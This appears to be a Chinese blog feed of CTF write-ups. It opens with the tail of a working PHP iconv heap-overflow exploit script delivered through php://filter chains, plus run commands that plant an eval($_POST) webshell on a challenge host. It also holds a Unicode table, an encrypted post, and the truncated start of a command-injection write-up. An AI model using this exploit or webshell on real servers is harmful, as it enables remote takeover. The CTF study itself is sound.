class="line">step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">step3_size = CS</span><br><span class="line"></span><br><span class="line">step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">step4_size = CS</span><br><span class="line">step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line"><span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">step4_pwn = ptr_bucket(</span><br><span class="line"><span class="number">0x200000</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="comment"># free_slot</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">size=CS,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">step4_custom_heap = ptr_bucket(</span><br><span class="line">ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">COMMAND = command</span><br><span class="line">COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> sleep:</span><br><span class="line">COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (</span><br><span class="line"><span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">step4_use_custom_heap = COMMAND</span><br><span class="line">step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">pages = (</span><br><span class="line">step4 * <span class="number">3</span></span><br><span class="line">+ step4_pwn</span><br><span class="line">+ step4_custom_heap</span><br><span class="line">+ step4_use_custom_heap</span><br><span class="line">+ step3_overflow</span><br><span class="line">+ pad * PAD</span><br><span class="line">+ step1 * <span class="number">3</span></span><br><span class="line">+ step2_write_ptr</span><br><span class="line">+ step2 * <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">resource = compress(compress(pages))</span><br><span class="line">resource = b64(resource)</span><br><span class="line">resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">filters = [</span><br><span class="line"><span class="comment"># Create buckets</span></span><br><span class="line"><span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 0: Setup heap</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line"><span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">]</span><br><span class="line">filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># print(path)</span></span><br><span class="line"><span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始攻击。攻击返回404是成功的标志，因为 command 最前面把进程 kill 掉了</span></span><br><span class="line"><span class="comment"># COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">path = build_exploit_path()</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:[num]:&quot;[data]&quot;;&#125;&#x27;</span></span><br><span class="line">        </span><br><span class="line">data = data.replace(<span class="string">&#x27;[num]&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(path)))</span><br><span class="line">data = data.replace(<span class="string">&#x27;[data]&#x27;</span>, quote(path))</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">r = requests.get(url + data).text</span><br><span class="line"><span class="comment"># print(&quot;r: &quot;,r)</span></span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----end-----&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;data； &quot;,data)</span></span><br><span class="line">data = b64decode(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> sleep:</span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> start + sleep &lt;= time.time():</span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_symbols_and_addresses()</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line">exploit()</span><br></pre></td></tr></table></figure><p>​在kali里面下载要用到的工具，pwntools，然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行:python3 exp.py url &quot;echo &#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27; &gt; 1.php&quot;</span><br><span class="line">python3 exp.py http://7e86bcb5-3ec7-4d27-9799-be6f80286ed9.challenge.ctf.show/ &quot;echo&#x27;?=@eval(\$_POST[0]);?&#x27;&gt;1.php&quot;</span><br><span class="line">python3 exp.py --url &quot;http://7e86bcb5-3ec7-4d27-9799-be6f80286ed9.challenge.ctf.show/&quot; --command &quot;echo&#x27;?=@eval(\$_POST[0]);?&#x27;&gt;1.php&quot;</span><br></pre></td></tr></table></figure><p>太难啦，看不懂ing…..</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unicode对应编码</title>
      <link href="/2024/07/15/Unicode%E5%AF%B9%E5%BA%94%E7%BC%96%E7%A0%81/"/>
      <url>/2024/07/15/Unicode%E5%AF%B9%E5%BA%94%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>代码（十六进制） 显示 描述</p><p>U+0020   空格</p><p>U+0021 ! <a href="https://baike.baidu.com/item/%E5%8F%B9%E5%8F%B7/1183777?fromModule=lemma_inlink">叹号</a></p><p>U+0022 ‘’ <a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">双引号</a></p><p>U+0023 # <a href="https://baike.baidu.com/item/%E4%BA%95%E5%8F%B7/2610020?fromModule=lemma_inlink">井号</a></p><p>U+0024 $ 价钱&#x2F;<a href="https://baike.baidu.com/item/%E8%B4%A7%E5%B8%81%E7%AC%A6%E5%8F%B7/2228422?fromModule=lemma_inlink">货币符号</a></p><p>U+0025 % <a href="https://baike.baidu.com/item/%E7%99%BE%E5%88%86%E6%AF%94/1303052?fromModule=lemma_inlink">百分比</a>符号</p><p>U+0026 &amp; 英文“and”的简写符号</p><p>U+0027 ‘[ 引号](<a href="https://baike.baidu.com/item/">https://baike.baidu.com/item/</a> 引号&#x2F;998963?fromModule&#x3D;lemma_inlink)</p><p>U+0028 ( 开 左<a href="https://baike.baidu.com/item/%E5%9C%86%E6%8B%AC%E5%8F%B7/10035461?fromModule=lemma_inlink">圆括号</a></p><p>U+0029 ) 关 右圆括号</p><p>U+002A * 星号（计算机的乘号）</p><p>U+002B +[ 加号](<a href="https://baike.baidu.com/item/">https://baike.baidu.com/item/</a> 加号&#x2F;7804899?fromModule&#x3D;lemma_inlink)</p><p>U+002C , <a href="https://baike.baidu.com/item/%E9%80%97%E5%8F%B7/998430?fromModule=lemma_inlink">逗号</a></p><p>U+002D - <a href="https://baike.baidu.com/item/%E8%BF%9E%E5%AD%97%E5%8F%B7/2713330?fromModule=lemma_inlink">连字号</a>&#x2F;<a href="https://baike.baidu.com/item/%E5%87%8F%E5%8F%B7/16830529?fromModule=lemma_inlink">减号</a></p><p>U+002E . 句号</p><p>U+002F &#x2F; 左<a href="https://baike.baidu.com/item/%E6%96%9C%E6%9D%A0/863387?fromModule=lemma_inlink">斜杠</a></p><p>U+0030 0 数字 0</p><p>U+0031 1 数字 1</p><p>U+0032 2 数字 2</p><p>U+0033 3 数字 3</p><p>U+0034 4 数字 4</p><p>U+0035 5 数字 5</p><p>U+0036 6 数字 6</p><p>U+0037 7 数字 7</p><p>U+0038 8 数字 8</p><p>U+0039 9 数字 9</p><p>U+003A : <a href="https://baike.baidu.com/item/%E5%86%92%E5%8F%B7/998617?fromModule=lemma_inlink">冒号</a></p><p>U+003B ; <a href="https://baike.baidu.com/item/%E5%88%86%E5%8F%B7/998579?fromModule=lemma_inlink">分号</a></p><p>U+003C ＜ <a href="https://baike.baidu.com/item/%E5%B0%8F%E4%BA%8E%E5%8F%B7/7805255?fromModule=lemma_inlink">小于号</a></p><p>U+003D &#x3D; 等于号</p><p>U+003E ＞[ 大于号](<a href="https://baike.baidu.com/item/">https://baike.baidu.com/item/</a> 大于号&#x2F;7805235?fromModule&#x3D;lemma_inlink)</p><p>U+003F ? <a href="https://baike.baidu.com/item/%E9%97%AE%E5%8F%B7/24766?fromModule=lemma_inlink">问号</a></p><p>U+0040 <a href="https://baike.baidu.com/item/@/506122?fromModule=lemma_inlink">@</a> 英文“at”的简写符号</p><p>U+0041 A 拉丁字母 A</p><p>U+0042 B 拉丁字母 B</p><p>U+0043 C 拉丁字母 C</p><p>U+0044 D 拉丁字母 D</p><p>U+0045 E 拉丁字母 E</p><p>U+0046 F 拉丁字母 F</p><p>U+0047 G 拉丁字母 G</p><p>U+0048 H 拉丁字母 H</p><p>U+0049 I 拉丁字母 I</p><p>U+004A J 拉丁字母 J</p><p>U+004B K 拉丁字母 K</p><p>U+004C L 拉丁字母 L</p><p>U+004D M 拉丁字母 M</p><p>U+004E N 拉丁字母 N</p><p>U+004F O 拉丁字母 O</p><p>U+0050 P 拉丁字母 P</p><p>U+0051 Q 拉丁字母 Q</p><p>U+0052 R 拉丁字母 R</p><p>U+0053 S 拉丁字母 S</p><p>U+0054 T 拉丁字母 T</p><p>U+0055 U 拉丁字母 U</p><p>U+0056 V 拉丁字母 V</p><p>U+0057 W 拉丁字母 W</p><p>U+0058 X 拉丁字母 X</p><p>U+0059 Y 拉丁字母 Y</p><p>U+005A Z 拉丁字母 Z</p><p>U+005B [ 开 <a href="https://baike.baidu.com/item/%E6%96%B9%E6%8B%AC%E5%8F%B7/9896244?fromModule=lemma_inlink">方括号</a></p><p>U+005C \ 右斜杠</p><p>U+005D ] 关 方括号</p><p>U+005E ^ 抑扬（重音）符号</p><p>U+005F _ 底线</p><p>U+0060 &#96; 重音符</p><p>U+0061 a 拉丁字母 a</p><p>U+0062 b 拉丁字母 b</p><p>U+0063 c 拉丁字母 c</p><p>U+0064 d 拉丁字母 d</p><p>U+0065 e 拉丁字母 e</p><p>U+0066 f 拉丁字母 f</p><p>U+0067 g 拉丁字母 g</p><p>U+0068 h 拉丁字母 h</p><p>U+0069 i 拉丁字母 i</p><p>U+006A j 拉丁字母 j</p><p>U+006B k 拉丁字母 k</p><p>U+006C l 拉丁字母 l（L的小写）</p><p>U+006D m 拉丁字母 m</p><p>U+006E n 拉丁字母 n</p><p>U+006F o 拉丁字母 o</p><p>U+0070 p 拉丁字母 p</p><p>U+0071 q 拉丁字母 q</p><p>U+0072 r 拉丁字母 r</p><p>U+0073 s 拉丁字母 s</p><p>U+0074 t 拉丁字母 t</p><p>U+0075 u 拉丁字母 u</p><p>U+0076 v 拉丁字母 v</p><p>U+0077 w 拉丁字母 w</p><p>U+0078 x 拉丁字母 x</p><p>U+0079 y 拉丁字母 y</p><p>U+007A z 拉丁字母 z</p><p>U+007B { 开 左花括号</p><p>U+007C | 直线</p><p>U+007D } 关 右花括号</p><p>U+007E ~ 波浪纹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>7-13总结</title>
      <link href="/2024/07/14/7-13%E6%80%BB%E7%BB%93/"/>
      <url>/2024/07/14/7-13%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dc99b85f79921a74de17437f9c51eadc59919d3ecfbab46f82e871c0b468992e">0ca2b35c8261f8c795eedabdc3bf52f2fcf7f46fbea3a83a0130a288c3b130462471d108affd3258306f3f87893d960dae049d3859c42d6e4a64a4f908388ab68199e4f422e7884f2522b3c9be5f99f6a72d114558263fe5d53f7f011715546c02b616b2c88b8f80addfd6f926f20586c75fc2408bed4a3e32e938ab68f7df4c8d132b9b65ad640a4aa850712ffe94677c0bab1e4e0347b391aad0e14f5c9d93407ab25b590a9ab97ac481ef53903496f0cfd5b808a99c36fa78aa16983e9e429250270fab5297ed7056eaf3092bf878d569660075f70261873edb1bf370e5ee42d6d48da7ab26c6f65bd0e316d0c8a691766216f575ac2a4db11e7759d846954a1135a229e43c4fe2b05905f44e5f8f9c32939a42a4d8d7d950c2c995806ad3b8877a0b78ad5029a07ab5c1ce58bf4b08a40405333ef09a7cca03e6d1e2fe64e1c1496af69443c0a46f7ad9c04e70c385d2320b93c92febc7a8f128c2bdafa831fbcd44adc2184462521f920b3ba0ae9c320487be87bb3c3df17e0c9c047cf99407aeed4f8a4194f390c2d6bee14fa04d7ccfb9c7246a6dfd8e639ba3bebccbc015b885dd2c9b51c7e387b6059abd9b740d2dafc7b0ee595a94d790301ca5ced61110d4f37fa41c8d51e2338962e9071d84d57d4145efd540bd0c881cd24e2a9e99bc844e4e1598de3cda8eb61e8573a8180c7ff2be3a7f1bdae29688850aba22e8690484738f2d11156e82c5358b123eb418068abdd355598d813bd34b86d0633ea7d185eced9346032ed4648561f8147a442792db0bb0c0139d79b7cccfef1a91a9caa85efee132f3948da336b2b4321dcb02bbda6acc225197563f5eff8fab36fc34b288800c706f5439b1759517abf5bafb3487f4f46bab876e6828e8cbe4a8d14254156d5b67d3a3645e1a99e359f2e99613592f9dd4bf7824051a968e9fec7d6c5afd6c130eafd4f72ee1cdb6ef5e8dc9eb24b749d9c7c2a83b29b77d3e1c0da0e5b9f3dfecd7b58db79faecfbd56792bff15e0e512eae1250f3f0fb70bebbdf30de12889afddde41603ab22a7f3be761750a0fe6d683a4a3e334a8c27a4929ae93db16a2b6650e8d665801e8d70b93130b33abaffd65e7c052651346d79325c30e5cf71a15ddb73de3229658e5341607996fc206cce9fe0ec38714e11c120a5ebdeb8faefe1cb3ffc6f8560ef11ba90b7dfe7bc342af20b5b12e0a898e2cb913bce307849eecefe20b7d1c0b074fecfda7c1d1be686f4960a5f0addb536f154d3cac4fc074b1d069b936e8d3d7ce5647aabe42f602324aaefadaf0b0964dff2ef04bdfed0c75c8c4a55f45f05e22ce4d5e8dad8f9d3c7f95a8673bffcc22b5872e7ee69b2d163d7434454ba811d1f1c883d9e87581d350386354e01b356b584f98799ce0d9360812fa5df71d61dee9dd9945b6887ed06338acf3ba68c41382a0d7f3840624911106feb87f03e36870ce7e946787f45c6590a39e2149c50bd9dc7b60b0b0c3b94293a21cbe573c9d25be45efbf8cf19846ed5987d5aa7aa3897a408e7087b5338d887d3dfb5348de4caa2a049fe60e1c4304b8699d4a1fe8d5301b4de2d7f05daf646692a2490fdc76f2355a715cdec5be17d5dded0cd95319e9d9f2ee2c3ac617f3e8bd56004e8560a46e1e3a83c83f22e212604226e4ccf7a5778f98fc914eabb202dd15d45db50374594f179ed487b6b17a513d0c18d3320cde51cd91c060f84f58d84119ada55cea9ad359c42a1d6f9bd7e483b7ba75b1e507047d737ce25bda23a4009596e601f28279d9c4c4eca5a37a6361f46a1a2812dae33571ff2ad920ed7a36bda8dcb3d0d4c616737a19a0a5810e72325ef60fc9f53c56cf305f986f461c3c42f61a54a57757a84ac919161a50296e70bd5fe4dd3153dfbb9f824d0ba7f55222db9dfb247db0170fcde678008df869bbc56d88c15bca0c3d594cbdc1b9ffe810036f0790f96926358bee2d33ddfed61bddf6d6264684710ef71fb8c9730152ef7a63177cfb5d578d619f0de614bf5b7d054dfce226ca58d8f0e53af3e59311bad4ef0e2c72730cff3ae9a3c41bf1e8500ad2e29a32da22f318bff4299f4dec72976d9f3b8665ef5875b072d2590885c5a01e9b7f7a68820d13333fc3f129a1b6912cd2a41312f3ba6540f2def931a5eafb3e67c34d395154575e2f470dc7b876010906632839478c7c33ec4f592d279e72f9d06b5d6a62e3d844329bcd26fdc9f96f103f23e1737abd79e8d62bfe2df7ddb85bbf09288cf988c4a923defe28c8fa56db229251af3f7d066577f30308b92ae8cb8737013bf4ea65c75b05d4e2325d394f9908637ccedd8bb14433b9e17eab17110c6ced4f65075d3a93b64cbde836896138b01dab1ff7d309e94908443f5b97d69c5f9e492a627340ad70f7fb7be0793af0fdee391f29addf0b776023b033ca8d397c92f7dc138acfa0453b1008fd41c9106ec3e5115463736ddf48c031b5da0de6099b1b4d152213dab9437dfb799745b978c995dab593810334b5b14d51ad6462066bbf88e6767c620a89f85ff186f217c296215fba04dcfe0851e4be02cc3a1238b7d6ed3e83895b8016537f70037aae3c948cdbfa0c46355ea2ae3e1394ac81bad73d85fde1b5b749700484ac6c6f9e066c1ec36eed7498eeb4d4850bee5a748238db846120bc9428381d3d2b43c4a398377e0d25d618a205adbaf5a9e9a549a2764aeb3b4ca05fc2b68b6b4cbb1f9aa39c64f7be87bab324401d81b1f5dd7b60f17629486752611ec849e3fb4b11b3952b02dffb31517f93e43b9e822736903034697abe447b8c86b81d3a876206e9dddc29d081fbf79da8ce29b234e11b6bf7e3cc6cad4217431be98c0e82eb9ed3e4c2992016092026d51e1ab77745edbb443dfb59380b87cbc5920d4b8c062e129ef72866cbfac2f2365599e3dba046911c0782aca6da1d061a186dcf66308ea700601080d9c7924f161ee08d3c0ceeca0c5ae5fd7d378bdb05173409a71a67bdddfd11f2095cbd6453b038df34238f698c1591c4c1fb5cfef53bfd22ea67253ab55551fd4c5c33af402d0e549b0ff22fe7a88d655a90d53e1a1071b0b23e9b0ea369ed377cf8390de6b0a53385a67cbfaf219b55045ba102103b47092dc26c84c106df486598b0fdc9f3cf193847beaaae99d0b66948c6bca507783effb24709c89d172746205b7d92bdf76c373a7fd51930b63a81a04984fea9530047f3530244d2b3491e58f1fbb3b6ca00c987776265e0e2273431be9a90fcb2bc663db1e393e260c573f30700a34ebf6309dd14c61cc48c6c549f90d23b53802ebab3fa8f472499f2bddaab000cc2a60accfeb331d861d02e6f00b4b22f43b2a9cc8226a6e23cab8087e14554ecf2d89a6b0cc1f0947b9f27c58b2c20a2703a6e6277a18798fd1aa0cd964d9552ec829ce7e6c9675641e17a66e0f60c61205aa06956516b4822576a39b512a0881b8a95282420ebbfc1ad006b0149973610a17fd95bd22d1ebc05c7951d5706957e2cd2a5e9e4cab7bab327eb6c5a542fbbd459d9770c9d26c50fd1c78b53f1c3866ba0812715a307009021ff6f6f2e5c923b2b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2024/07/13/RCE/"/>
      <url>/2024/07/13/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无字母数字的命令执行-web55"><a href="#无字母数字的命令执行-web55" class="headerlink" title="无字母数字的命令执行(web55)"></a>无字母数字的命令执行(web55)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="1-点命令"><a href="#1-点命令" class="headerlink" title="1.点命令"></a>1.点命令</h3><p>​Linux中的点(<code>.</code>)命令,即source命令，可以用当前的shell执行一个文件中的命令，且是不需要file有x权限的。比如，当前运行的shell是bash,则<code>. file</code>的意思是用bash执行file文件中的命令</p><h3 id="2-通配符的使用"><a href="#2-通配符的使用" class="headerlink" title="2.通配符的使用"></a>2.通配符的使用</h3><p>​glob支持<code>**</code>替代0个及多个字符</p><p>​glob支持<code>?</code>代替1个任意字符</p><p>​glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p><p>​glob支持利用<code>[0-9]</code>来表示一个范围。</p><h3 id="3-PHP保存文件机制"><a href="#3-PHP保存文件机制" class="headerlink" title="3.PHP保存文件机制"></a>3.PHP保存文件机制</h3><p>​当PHP接收到新上传的文件时，它会将上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx,后6个x为随机的大小写字母</p><h2 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h2><h3 id="1-构造一个post上传数据包并抓包"><a href="#1-构造一个post上传数据包并抓包" class="headerlink" title="1.构造一个post上传数据包并抓包"></a>1.构造一个post上传数据包并抓包</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:xxxxxxx/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span 